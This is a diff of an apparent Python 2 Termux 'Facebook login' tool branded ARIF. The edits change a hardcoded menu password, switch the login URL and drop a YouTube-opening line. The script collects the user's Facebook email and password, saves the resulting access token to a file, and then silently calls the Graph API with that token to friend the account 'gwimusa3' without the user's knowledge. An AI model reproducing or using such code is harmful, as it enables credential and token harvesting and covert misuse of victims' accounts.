@@ -109,11 +109,12 @@ jalan('\033[1;95m▬▬▬▬▬▬▬▬▬100%')
 print "\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mARIF\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 
 
-CorrectUsername = "bd"
-CorrectPassword = "bd"
+
 
 CorrectUsername = "ARIF"
 CorrectPassword = "ARIF"
+
+
 
 loop = 'true'
 while (loop == 'true'):
@@ -140,15 +141,15 @@ def login():
 		print logo
 		jalan(' \033[1;91mWarning: \033[1;95mDo Not Use Your Personal Account' )
 		jalan(' \033[1;91mWarning: \033[1;95mUse a New Account To Login' )
-		jalan(' \033[1;91mWarning: \033[1;95mTermux Old Version install 0.63✅' )                 
-		print "\033[1;94m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;91mARIF\033[1;94m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+		                
+		print          "\033[1;94m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;91mARIF\033[1;94m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 		print('	   \033[1;94m▬\x1b[1;94m✔✔✔✔✔✔✔LOGIN WITH FACEBOOK✔✔✔✔✔✔✔\x1b[1;94m▬' )
 		print('	' )
 		id = raw_input('\033[1;91m[+] \x1b[1;94mID/Email\x1b[1;95m: \x1b[1;93m')
 		pwd = raw_input('\033[1;91m[+] \x1b[1;91mPassword\x1b[1;96m: \x1b[1;93m')
 		tik()
 		try:
-			br.open('https://mbasic.facebook.com')
+			br.open('https://www.facebook.com')
 		except mechanize.URLError:
 			print"\n\x1b[1;96mThere is no internet connection"
 			keluar()
@@ -173,7 +174,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;92mLogin Successful.•◈•..'
-				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+				
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
